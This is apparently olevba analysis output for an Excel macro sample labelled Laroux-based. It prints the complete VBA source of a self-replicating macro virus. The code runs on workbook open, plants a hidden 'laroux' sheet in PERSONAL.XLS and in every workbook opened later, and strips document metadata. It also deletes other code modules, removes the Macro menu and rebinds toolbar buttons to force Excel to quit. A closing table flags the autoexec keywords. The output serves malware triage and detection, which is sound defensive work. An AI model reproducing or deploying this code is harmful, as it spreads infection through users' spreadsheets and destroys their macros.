olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-2d1f17268ceb01d59335aab2814d6a7a47e6be96
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO laroux.bas 
in file: Virus.MSExcel.Laroux-based-2d1f17268ceb01d59335aab2814d6a7a47e6be96 - OLE stream: '_VBA_PROJECT_CUR/VBA/laroux'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public jj As Integer
Public n4 As String
Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
fr
Application.ScreenUpdating = False
Application.OnSheetActivate = "aa"
Application.OnWindow = "bb"
Application.StatusBar = ""
n4 = UCase(ActiveWorkbook.Name)
'Application.OnKey "^{f}", "ab"
'Application.OnKey "^{d}", "AG"
If n4 = "PERSONAL.XLS" Then
ActiveWindow.Visible = False
Exit Sub
End If
jj = ActiveWorkbook.Modules.Count
Dim ss As Worksheet
If ActiveWorkbook.Worksheets.Count = 0 Then ActiveWorkbook.Close
For Each ss In ActiveWorkbook.Worksheets
ss.Activate: Exit For
Next ss
check_files
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.ScreenUpdating = False
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "PERSONAL.XLS")
    If m$ = "PERSONAL.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10 '

m2:     as1 = ac
Select Case as1
Case 0
If p = 1 Then
gh = Application.StartupPath
Workbooks.Open Filename:=Application.StartupPath & "\" & "personal.xls"
ActiveWindow.Visible = False
Else
    Application.ScreenUpdating = False
    lar = laroux()
    Sheets("laroux").Visible = True
    Sheets("laroux").Select
    Sheets("laroux").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & "PERSONAL.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("laroux").Visible = False

End If
acd = ac: GoTo m2:
Case 1
Exit Sub
Case 2
    Windows(n4).Activate
    Application.ScreenUpdating = False
    Sheets("laroux").Visible = True
    Sheets("laroux").Select
'    Sheets("laroux").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With

    Windows("PERSONAL.XLS").Visible = True
    Windows(n4).Activate
    Sheets("laroux").Select
    Sheets("laroux").Copy Before:=Workbooks("PERSONAL.XLS").Sheets(1)
    ActiveWorkbook.Save
    ActiveWindow.Visible = False
    Sheets("laroux").Visible = False
End Select


Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("laroux").Visible = True
    Sheets("laroux").Select
    Sheets("laroux").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & "PERSONAL.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("laroux").Visible = False
'    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
'    Application.OnSheetActivate = "personal.xls!check_files"

Case 11
    
       


Case Else
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "laroux" Then
        Workbooks("PERSONAL.XLS").Sheets("laroux").Copy Before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("laroux").Visible = False
    Else
    End If



End Select
    Application.ScreenUpdating = True
Application.Windows("personal.xls").OnWindow = "AF"
Application.OnWindow = "bb"
End Sub


Sub aa()
Attribute aa.VB_ProcData.VB_Invoke_Func = " \n14"
Application.ScreenUpdating = False
Application.DisplayAlerts = False
Application.StatusBar = ""

On Error Resume Next
ad

If InStr(1, ActiveSheet.Name, "ux") <> 0 Or _
 InStr(1, ActiveSheet.Name, "Ìîä") <> 0 Or _
 InStr(1, ActiveSheet.Name, "Mod") Then
If ActiveWorkbook.Name = "PERSONAL.XLS" Then AF: Exit Sub
ActiveSheet.Delete
'ActiveWorkbook.Close
Exit Sub
End If

For Each mn In ActiveWorkbook.Modules
If mn.Name = "laroux" Then Exit Sub
Next mn
n5 = ActiveWorkbook.Name
Workbooks("PERSONAL.XLS").Sheets("laroux").Copy Before:=Workbooks(n5).Sheets(1)
Workbooks(n5).Sheets("laroux").Visible = False
ActiveWorkbook.Save
End Sub

Sub ab()
Attribute ab.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.OnSheetActivate = ""
'AG
End Sub

Function ac()
Attribute ac.VB_ProcData.VB_Invoke_Func = " \n14"
Application.ScreenUpdating = False
For Each ww In Windows
ww.Visible = True
Next ww
acc = 0
For Each ww In Windows
ww.Activate
fg = ActiveWorkbook.Name
If UCase(ActiveWorkbook.Name) = "PERSONAL.XLS" Then
Windows("personal.xls").Activate
For Each ee In ActiveWorkbook.Sheets
If Trim(UCase(ee.Name)) = "LAROUX" Then
ActiveWindow.ActivatePrevious: acc = 1
GoTo en:
End If
Next ee
ActiveWindow.ActivatePrevious
acc = 2
GoTo en:
End If
Next ww
en:
Application.ScreenUpdating = True
ac = acc
If acc > 0 Then Windows("personal.xls").Visible = False
End Function

Sub ad()
Attribute ad.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
ActiveWorkbook.Sheets("laroux").Visible = False
End Sub

Function AF()
Attribute AF.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Windows("PERSONAL.XLS").Visible = False
End Function
Sub AG()
Attribute AG.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.Windows("personal.xls").OnWindow = ""
Application.OnWindow = "bb"
End Sub

Function AE()
Attribute AE.VB_ProcData.VB_Invoke_Func = " \n14"
Application.OnSheetActivate = "aa"
End Function

Function ASS()
Attribute ASS.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.OnWindow = "bb"
End Function

Function bb()
Attribute bb.VB_ProcData.VB_Invoke_Func = " \n14"
wa = ActiveWorkbook.Name
Application.ScreenUpdating = False
Application.DisplayAlerts = False
For Each ww In Windows
ww.Activate
fg = ActiveWorkbook.Name
If UCase(ActiveWorkbook.Name) = "PERSONAL.XLS" Then acc = 5: GoTo wn:
For Each wm In ActiveWorkbook.Modules
If Trim(UCase(wm.Name)) = "LAROUX" Then GoTo we:
wm.Delete
pr = 1
we:
Next wm
wn:
Next ww
If acc > 0 Then Windows("personal.xls").Visible = False
If pr = 1 Then ActiveWorkbook.Save
Application.OnWindow = ""
Windows(wa).Activate
Application.OnWindow = "bb"
End Function

Function laroux()
For Each ww In Windows
ww.Activate
For Each we In ActiveWorkbook.Sheets
If Trim(UCase(ActiveSheet.Name)) = "LAROUX" Then Exit Function
Next we
Next ww
End Function

Function fr()
Attribute fr.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Set men = MenuBars(xlModule).Menus("Ñåðâèñ").MenuItems("Ìàêðîñ...")
men.Delete
Set men = MenuBars(xlWorksheet).Menus("Ñåðâèñ").MenuItems("Ìàêðîñ...")
men.Delete
Set bn = Application.Toolbars(9).ToolbarButtons(2)
bn.Delete
For Each bn In Application.Toolbars(9).ToolbarButtons
bn.OnAction = "fff"
Next bn
End Function

Function fff()
Attribute fff.VB_ProcData.VB_Invoke_Func = " \n14"
Application.DisplayAlerts = False
On Error Resume Next
ActiveWorkbook.Save
Application.Quit
End Function

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  larou
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
+----------+--------------------+---------------------------------------------+

